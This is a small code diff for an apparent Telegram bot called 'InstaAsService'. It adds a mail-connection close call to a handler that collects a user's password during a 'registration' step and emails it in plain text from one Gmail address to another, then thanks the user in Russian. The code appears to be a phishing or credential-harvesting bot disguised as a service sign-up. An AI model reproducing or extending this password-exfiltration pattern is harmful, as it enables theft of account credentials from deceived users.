@@ -69,6 +69,7 @@ def process_autorisation2(message):
 def process_autorised(message):
     password = message.text
     mailObj.sendmail("kirypanin@gmail.com", "pankiblackod@gmail.com", password)
+    mailObj.quit()
     msg = bot.send_message(message.chat.id, 'Благодарим за регистрацию на сервисе InstaAsService. Ваша анкета отправлена в раздел исполнитлей и вскоре найдет своего заказчика', reply_markup=menu)
     bot.register_next_step_handler(msg, process_menu)
 
